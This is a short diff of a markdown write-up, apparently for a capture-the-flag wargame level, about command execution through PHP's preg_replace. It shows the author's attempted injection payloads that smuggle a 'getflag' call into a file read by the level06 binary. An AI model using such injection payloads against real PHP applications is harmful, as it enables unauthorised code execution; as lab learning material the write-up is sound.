@@ -91,7 +91,7 @@ Theorical steps:
 https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/ </br>
 https://www.php.net/manual/en/language.types.string.php </br>
 
-In reality:
+In reality: </br>
 Struggled **a lot** to find good syntax, tried: </br>
 `echo '[x $(getflag)]' > /tmp/flag && ./level06 /tmp/flag` </br>
 `echo '[x ${system(getflag)}]' > /tmp/flag && ./level06 /tmp/flag` </br>
